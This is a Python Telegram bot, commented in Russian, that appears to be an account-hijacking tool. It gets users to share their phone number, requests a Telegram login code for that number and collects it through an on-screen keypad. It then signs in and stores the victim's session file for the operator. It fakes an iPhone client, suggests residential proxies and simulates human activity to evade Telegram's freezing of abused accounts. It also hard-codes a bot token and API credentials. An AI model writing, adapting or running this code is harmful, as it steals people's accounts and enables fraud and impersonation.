import os
import asyncio
import logging
from datetime import datetime

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, Contact, ReplyKeyboardMarkup, KeyboardButton,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    AuthKeyUnregisteredError,
    UserDeactivatedBanError,
)

# ================== НАСТРОЙКИ ДЛЯ ОБХОДА ЗАМОРОЗКИ ==================
# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
PROXY = None
# Пример residential прокси (SOCKS5 — самый рабочий):
# PROXY = (socks.SOCKS5, "1.2.3.4", 1080, True, "login", "password")
# Не забудь: pip install pysocks

DEVICE_MODEL = "iPhone 16 Pro Max"
SYSTEM_VERSION = "iOS 18.3"
APP_VERSION = "11.8.0"
LANG_CODE = "ru"
SYSTEM_LANG_CODE = "ru-RU"
# ================================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[logging.StreamHandler(), logging.FileHandler("bot.log", encoding="utf-8")]
)
logger = logging.getLogger(__name__)

BOT_TOKEN = '8757500911:AAEbSh9hlRam0GYC1HdkoXCGTd9Q1vVBeNc'
API_ID = 31462757
API_HASH = '79ae4e151e84526e11b107e99ad67177'
ADMIN_IDS = {8559221549}

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)


# ────────────────────────────────────────────────
# СОСТОЯНИЯ И КЛАВИАТУРЫ (без изменений)
# ────────────────────────────────────────────────
class AddSession(StatesGroup):
    waiting_phone = State()
    waiting_code = State()


def get_continue_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        resize_keyboard=True, one_time_keyboard=True,
        keyboard=[[KeyboardButton(text="Продолжить", request_contact=True)]]
    )


def get_code_keyboard(current_code: str = "") -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(text="1", callback_data="code:1"), InlineKeyboardButton(text="2", callback_data="code:2"), InlineKeyboardButton(text="3", callback_data="code:3")],
        [InlineKeyboardButton(text="4", callback_data="code:4"), InlineKeyboardButton(text="5", callback_data="code:5"), InlineKeyboardButton(text="6", callback_data="code:6")],
        [InlineKeyboardButton(text="7", callback_data="code:7"), InlineKeyboardButton(text="8", callback_data="code:8"), InlineKeyboardButton(text="9", callback_data="code:9")],
        [InlineKeyboardButton(text="0", callback_data="code:0"), InlineKeyboardButton(text="← стереть", callback_data="code:back"), InlineKeyboardButton(text="Отмена", callback_data="code:cancel")],
        [InlineKeyboardButton(text="✓ Подтвердить", callback_data="code:confirm")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)


def mask_code(code: str) -> str:
    if not code:
        return "•••••"
    return "•" * (len(code) - 1) + code[-1]


# ────────────────────────────────────────────────
# /start
# ────────────────────────────────────────────────
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    if message.from_user.id in ADMIN_IDS:
        count = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")])
        await message.answer(f"Привет, админ!\nСессий: <b>{count}</b>")
        return

    await message.answer(
        "Нажми «Продолжить», чтобы добавить сессию.",
        reply_markup=get_continue_keyboard()
    )
    await state.set_state(AddSession.waiting_phone)


# ────────────────────────────────────────────────
# Шаг 1 — номер телефона
# ────────────────────────────────────────────────
@router.message(F.contact, StateFilter(AddSession.waiting_phone))
async def process_phone(message: Message, state: FSMContext):
    contact = message.contact
    phone = contact.phone_number.replace("+", "").replace(" ", "").replace("-", "")

    if not phone.isdigit() or len(phone) < 9:
        await message.reply("Некорректный номер.")
        await state.clear()
        return

    session_path = os.path.join(SESSIONS_DIR, f"{phone}.session")

    client = TelegramClient(
        session_path, API_ID, API_HASH,
        device_model=DEVICE_MODEL,
        system_version=SYSTEM_VERSION,
        app_version=APP_VERSION,
        lang_code=LANG_CODE,
        system_lang_code=SYSTEM_LANG_CODE,
        proxy=PROXY
    )

    try:
        await client.connect()
        if await client.is_user_authorized():
            await message.reply("Уже авторизован.")
            await state.clear()
            return

        sent_code = await client.send_code_request(phone)

        msg = await message.reply(
            f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:",
            reply_markup=get_code_keyboard()
        )

        await state.update_data(
            phone=phone,
            session_path=session_path,
            code_message_id=msg.message_id,
            current_code=""
        )
        await state.set_state(AddSession.waiting_code)

        logger.info(f"Код отправлен на +{phone} (с прокси и мобильными параметрами)")

    except FloodWaitError as e:
        await message.reply(f"Флуд. Подожди {e.seconds // 60 + 1} мин.")
        await state.clear()
    except Exception as e:
        logger.exception("Ошибка запроса кода")
        await message.reply(f"Ошибка: {str(e)[:200]}")
        await state.clear()
    finally:
        await client.disconnect()


# ────────────────────────────────────────────────
# Обработка кнопок кода
# ────────────────────────────────────────────────
@router.callback_query(StateFilter(AddSession.waiting_code))
async def process_code_button(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    current_code = data.get("current_code", "")
    phone = data.get("phone")
    session_path = data.get("session_path")
    code_msg_id = data.get("code_message_id")

    action = callback.data.split(":", 1)[1] if ":" in callback.data else ""

    if action.isdigit() and len(current_code) < 5:
        current_code += action
        await state.update_data(current_code=current_code)
    elif action == "back" and current_code:
        current_code = current_code[:-1]
        await state.update_data(current_code=current_code)
    elif action == "cancel":
        await state.clear()
        await callback.message.edit_text("Авторизация отменена.")
        await callback.answer()
        return
    elif action == "confirm":
        if len(current_code) != 5:
            await callback.answer("Нужно 5 цифр!", show_alert=True)
            return

        client = TelegramClient(
            session_path, API_ID, API_HASH,
            device_model=DEVICE_MODEL,
            system_version=SYSTEM_VERSION,
            app_version=APP_VERSION,
            lang_code=LANG_CODE,
            system_lang_code=SYSTEM_LANG_CODE,
            proxy=PROXY
        )

        try:
            await client.connect()
            logger.info(f"Попытка входа +{phone} с кодом {current_code}")

            await client.sign_in(phone=phone, code=current_code)

            # === ИМИТАЦИЯ ЧЕЛОВЕКА (самое важное против фриза) ===
            await asyncio.sleep(3)
            await client.send_message("me", "✅ Сессия успешно добавлена через бота")
            await asyncio.sleep(2)

            me = await client.get_me()
            logger.info(f"УСПЕШНЫЙ ВХОД → {me.first_name} (@{me.username})")

            await callback.message.edit_text(
                f"Готово! +{phone} авторизован.\n"
                "Сессия сохранена и прогрета."
            )

            await state.clear()

        except (AuthKeyUnregisteredError, UserDeactivatedBanError):
            await callback.message.edit_text("Аккаунт заморожен Telegram.\nНапиши @SpamBot для разблокировки.")
        except PhoneCodeInvalidError:
            await callback.answer("Неверный код", show_alert=True)
            await state.update_data(current_code="")
            await bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=code_msg_id,
                text=f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код (неверный):",
                reply_markup=get_code_keyboard("")
            )
        except PhoneCodeExpiredError:
            await callback.message.edit_text("Код устарел. /start")
        except SessionPasswordNeededError:
            await callback.message.edit_text("Включена 2FA — пока не поддерживается.")
        except FloodWaitError as e:
            await callback.message.edit_text(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
        except Exception as e:
            logger.exception("Ошибка sign_in")
            await callback.message.edit_text(f"Ошибка: {str(e)[:200]}")
        finally:
            await client.disconnect()

        await callback.answer()
        return

    # Обновление клавиатуры
    display = mask_code(current_code)
    text = f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:\n<b>{display}</b>"
    if code_msg_id:
        try:
            await bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=code_msg_id,
                text=text,
                reply_markup=get_code_keyboard(current_code)
            )
        except:
            pass
    await callback.answer()


# ────────────────────────────────────────────────
# Запуск
# ────────────────────────────────────────────────
async def main():
    logger.info("Бот запущен с защитой от заморозки")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
